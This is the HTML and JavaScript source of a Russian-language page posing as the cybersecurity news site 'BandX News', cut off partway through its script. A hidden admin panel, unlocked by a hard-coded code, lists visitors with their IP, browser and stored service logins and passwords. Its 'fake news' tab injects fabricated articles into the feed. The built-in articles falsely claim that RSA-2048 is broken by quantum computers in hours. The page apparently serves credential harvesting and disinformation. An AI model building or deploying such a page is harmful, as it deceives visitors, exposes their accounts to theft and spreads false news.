<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BandX News - Новости кибербезопасности</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }

        .header {
            background: rgba(255, 255, 255, 0.95);
            padding: 1rem 2rem;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 1.8rem;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .admin-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 0.7rem 1.5rem;
            border-radius: 25px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .admin-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }

        .container {
            max-width: 1400px;
            margin: 100px auto 2rem;
            padding: 0 2rem;
        }

        .news-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
            gap: 2rem;
            margin-top: 2rem;
        }

        .news-card {
            background: white;
            border-radius: 15px;
            padding: 2rem;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
            display: flex;
            flex-direction: column;
        }

        .news-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        }

        .news-date {
            color: #667eea;
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
        }

        .news-title {
            font-size: 1.3rem;
            font-weight: 600;
            margin-bottom: 1rem;
            color: #2d3748;
        }

        .news-content {
            color: #4a5568;
            line-height: 1.6;
            margin-bottom: 1rem;
        }

        .expand-btn {
            background: transparent;
            color: #667eea;
            border: 2px solid #667eea;
            padding: 0.5rem 1rem;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            margin-top: auto;
            align-self: flex-start;
        }

        .expand-btn:hover {
            background: #667eea;
            color: white;
        }

        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
        }

        .modal-content {
            background: white;
            padding: 2rem;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 90%;
            text-align: center;
            position: relative;
        }

        .admin-panel {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 1000px;
            max-height: 90vh;
            background: white;
            border-radius: 20px;
            padding: 2rem;
            z-index: 3000;
            display: none;
            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
        }

        .modal-title {
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            color: #2d3748;
        }

        .code-input {
            width: 100%;
            padding: 1rem;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            font-size: 1.1rem;
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .modal-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 1rem 2rem;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            width: 100%;
        }

        .admin-tabs {
            display: flex;
            margin-bottom: 1.5rem;
            border-bottom: 2px solid #e2e8f0;
        }

        .admin-tab {
            padding: 0.8rem 1.5rem;
            background: none;
            border: none;
            cursor: pointer;
            font-weight: 600;
            color: #718096;
            border-bottom: 3px solid transparent;
        }

        .admin-tab.active {
            color: #667eea;
            border-bottom-color: #667eea;
        }

        .tab-content {
            display: none;
            max-height: 60vh;
            overflow-y: auto;
            padding: 1rem;
        }

        .tab-content.active {
            display: block;
        }

        .visitors-grid, .fake-news-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 1rem;
        }

        .visitor-item, .fake-news-item {
            display: flex;
            gap: 0.5rem;
            align-items: center;
        }

        .visitor-btn, .fake-news-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 1rem;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 600;
            text-align: center;
            flex: 1;
        }

        .delete-btn {
            background: #e53e3e;
            color: white;
            border: none;
            padding: 1rem;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 600;
            width: 50px;
        }

        .add-news-btn {
            background: #48bb78;
            color: white;
            border: none;
            padding: 1rem 2rem;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 600;
            margin-bottom: 1rem;
            width: 100%;
        }

        .data-content {
            background: #f7fafc;
            padding: 1.5rem;
            border-radius: 10px;
            margin-top: 1rem;
            text-align: left;
            max-height: 400px;
            overflow-y: auto;
        }

        .close-btn {
            position: absolute;
            top: 1rem;
            right: 1rem;
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: #718096;
        }

        .footer {
            text-align: center;
            padding: 2rem;
            color: white;
            margin-top: 4rem;
        }

        .password-data {
            background: #fed7d7;
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
        }

        .password-item {
            margin: 0.5rem 0;
            padding: 0.5rem;
            background: #fff5f5;
            border-radius: 5px;
        }

        .form-group {
            margin-bottom: 1rem;
            text-align: left;
        }

        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
        }

        .form-input, .form-textarea {
            width: 100%;
            padding: 0.8rem;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 1rem;
        }

        .form-textarea {
            min-height: 120px;
            resize: vertical;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">BandX News</div>
        <button class="admin-btn" onclick="openAdminModal()">АДМИН</button>
    </header>

    <div class="container">
        <h1 style="color: white; text-align: center; margin-bottom: 2rem;">Актуальные новости кибербезопасности 2025</h1>
        <div class="news-grid" id="newsGrid"></div>
    </div>

    <footer class="footer">
        <p>© 2025 BandX News. Все права защищены.</p>
    </footer>

    <!-- Admin Login Modal -->
    <div class="modal" id="adminModal">
        <div class="modal-content">
            <button class="close-btn" onclick="closeAdminModal()">×</button>
            <h2 class="modal-title">Введите код доступа</h2>
            <input type="password" class="code-input" id="adminCode" placeholder="Введите код...">
            <button class="modal-btn" onclick="checkAdminCode()">ПОДТВЕРДИТЬ</button>
        </div>
    </div>

    <!-- Admin Panel -->
    <div class="admin-panel" id="adminPanel">
        <button class="close-btn" onclick="closeAdminPanel()">×</button>
        <h2 class="modal-title">Панель администратора</h2>
        
        <div class="admin-tabs">
            <button class="admin-tab active" onclick="switchTab('visitors')">Посетители</button>
            <button class="admin-tab" onclick="switchTab('fake-news')">Фейк Новости</button>
        </div>

        <div class="tab-content active" id="visitors-tab">
            <div class="visitors-grid" id="visitorsGrid"></div>
        </div>

        <div class="tab-content" id="fake-news-tab">
            <button class="add-news-btn" onclick="openAddNewsModal()">+ Добавить Новость</button>
            <div class="fake-news-grid" id="fakeNewsGrid"></div>
        </div>
    </div>

    <!-- Data View Modal -->
    <div class="modal" id="dataModal">
        <div class="modal-content">
            <button class="close-btn" onclick="closeDataModal()">×</button>
            <h2 class="modal-title">Данные посетителя</h2>
            <div class="data-content" id="dataContent"></div>
        </div>
    </div>

    <!-- Add News Modal -->
    <div class="modal" id="addNewsModal">
        <div class="modal-content">
            <button class="close-btn" onclick="closeAddNewsModal()">×</button>
            <h2 class="modal-title">Добавить фейк новость</h2>
            
            <div class="form-group">
                <label class="form-label">Заголовок новости</label>
                <input type="text" class="form-input" id="newsTitle" placeholder="Введите заголовок...">
            </div>
            
            <div class="form-group">
                <label class="form-label">Дата публикации</label>
                <input type="text" class="form-input" id="newsDate" value="20.12.2025">
            </div>
            
            <div class="form-group">
                <label class="form-label">Содержание новости</label>
                <textarea class="form-textarea" id="newsContent" placeholder="Введите текст новости..."></textarea>
            </div>
            
            <button class="modal-btn" onclick="saveFakeNews()">СОХРАНИТЬ НОВОСТЬ</button>
        </div>
    </div>

    <!-- News Modal -->
    <div class="modal" id="newsModal">
        <div class="modal-content">
            <button class="close-btn" onclick="closeNewsModal()">×</button>
            <h2 class="modal-title" id="newsModalTitle"></h2>
            <div class="news-date" id="newsModalDate"></div>
            <div class="data-content" id="newsModalContent"></div>
        </div>
    </div>

    <script>
        // Глобальные переменные
        let visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
        let fakeNews = JSON.parse(localStorage.getItem('fakeNews') || '[]');

        // Базовые новости
        const defaultNews = [
            {
                title: "Квантовые компьютеры взламывают шифрование",
                content: "Исследователи подтвердили, что квантовые компьютеры теперь способны взламывать RSA-2048 за несколько часов...",
                fullContent: "Исследователи подтвердили, что квантовые компьютеры теперь способны взламывать RSA-2048 за несколько часов. Криптографическое сообщество переходит на постквантовые алгоритмы.",
                date: "20.12.2025",
                source: "BandX News"
            },
            {
                title: "ИИ-атаки нового поколения",
                content: "Злоумышленники используют генеративные AI для создания полиморфного кода...",
                fullContent: "Злоумышленники используют генеративные AI для создания полиморфного кода, который обходит все известные антивирусные системы.",
                date: "19.12.2025",
                source: "BandX News"
            },
            {
                title: "Метавселенные под атакой",
                content: "Исследователи обнаружили уязвимости в популярных метавселенных...",
                fullContent: "Исследователи обнаружили уязвимости в популярных метавселенных, позволяющие получать доступ к биометрическим данным.",
                date: "18.12.2025",
                source: "BandX News"
            }
        ];

        // Функции модальных окон
        function openAdminModal() {
            document.getElementById('adminModal').style.display = 'flex';
        }

        function closeAdminModal() {
            document.getElementById('adminModal').style.display = 'none';
        }

        function openAdminPanel() {
            document.getElementById('adminPanel').style.display = 'block';
            loadVisitors();
        }

        function closeAdminPanel() {
            document.getElementById('adminPanel').style.display = 'none';
        }

        function openDataModal() {
            document.getElementById('dataModal').style.display = 'flex';
        }

        function closeDataModal() {
            document.getElementById('dataModal').style.display = 'none';
        }

        function openAddNewsModal() {
            document.getElementById('addNewsModal').style.display = 'flex';
        }

        function closeAddNewsModal() {
            document.getElementById('addNewsModal').style.display = 'none';
        }

        function openNewsModal() {
            document.getElementById('newsModal').style.display = 'flex';
        }

        function closeNewsModal() {
            document.getElementById('newsModal').style.display = 'none';
        }

        // Проверка кода админа
        function checkAdminCode() {
            const code = document.getElementById('adminCode').value;
            if (code === '11448888') {
                closeAdminModal();
                openAdminPanel();
            } else {
                alert('Неверный код!');
            }
        }

        // Переключение вкладок
        function switchTab(tabName) {
            // Скрыть все вкладки
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.admin-tab').forEach(tab => {
                tab.classList.remove('active');
            });

            // Показать выбранную вкладку
            document.getElementById(tabName + '-tab').classList.add('active');
            document.querySelector(`[onclick="switchTab('${tabName}')"]`).classList.add('active');

            // Загрузить данные для вкладки
            if (tabName === 'visitors') {
                loadVisitors();
            } else if (tabName === 'fake-news') {
                loadFakeNews();
            }
        }

        // Загрузка посетителей
        function loadVisitors() {
            const grid = document.getElementById('visitorsGrid');
            grid.innerHTML = '';

            if (visitors.length === 0) {
                grid.innerHTML = '<p style="grid-column: 1/-1; text-align: center; color: #666;">Нет данных о посетителях</p>';
                return;
            }

            visitors.forEach((visitor, index) => {
                const item = document.createElement('div');
                item.className = 'visitor-item';
                item.innerHTML = `
                    <button class="visitor-btn" onclick="showVisitorData(${index})">IP: ${visitor.ip}</button>
                    <button class="delete-btn" onclick="deleteVisitor(${index})">×</button>
                `;
                grid.appendChild(item);
            });
        }

        // Показать данные посетителя
        function showVisitorData(index) {
            const visitor = visitors[index];
            const content = document.getElementById('dataContent');
            
            let passwordsHTML = '';
            if (visitor.passwords && visitor.passwords.length > 0) {
                passwordsHTML = visitor.passwords.map(pass => `
                    <div class="password-item">
                        <strong>Сервис:</strong> ${pass.service}<br>
                        <strong>Логин:</strong> ${pass.login}<br>
                        <strong>Пароль:</strong> ${pass.password}
                    </div>
                `).join('');
            }

            content.innerHTML = `
                <div><strong>Время:</strong> ${new Date(visitor.timestamp).toLocaleString('ru-RU')}</div>
                <div><strong>IP:</strong> ${visitor.ip}</div>
                <div><strong>Браузер:</strong> ${visitor.browser}</div>
                <div><strong>Платформа:</strong> ${visitor.platform}</div>
                ${passwordsHTML ? `<div class="password-data">${passwordsHTML}</div>` : ''}
            `;
            openDataModal();
        }

        // Удалить посетителя
        function deleteVisitor(index) {
            visitors.splice(index, 1);
            localStorage.setItem('visitors', JSON.stringify(visitors));
            loadVisitors();
        }

        // Загрузка фейк-новостей
        function loadFakeNews() {
            const grid = document.getElementById('fakeNewsGrid');
            grid.innerHTML = '';

            if (fakeNews.length === 0) {
                grid.innerHTML = '<p style="grid-column: 1/-1; text-align: center; color: #666;">Нет фейк-новостей</p>';
                return;
            }

            fakeNews.forEach((news, index) => {
                const item = document.createElement('div');
                item.className = 'fake-news-item';
                item.innerHTML = `
                    <button class="fake-news-btn" onclick="showFullNews(${index})">${news.title.substring(0, 30)}...</button>
                    <button class="delete-btn" onclick="deleteFakeNews(${index})">×</button>
                `;
                grid.appendChild(item);
            });
        }

        // Сохранить фейк-новость
        function saveFakeNews() {
            const title = document.getElementById('newsTitle').value;
            const date = document.getElementById('newsDate').value;
            const content = document.getElementById('newsContent').value;

            if (!title || !date || !content) {
                alert('Заполните все поля!');
                return;
            }

            const newsItem = {
                title: title,
                content: content,
                fullContent: content,
                date: date,
                source: "BandX News"
            };

            fakeNews.unshift(newsItem);
            localStorage.setItem('fakeNews', JSON.stringify(fakeNews));
            
            closeAddNewsModal();
          
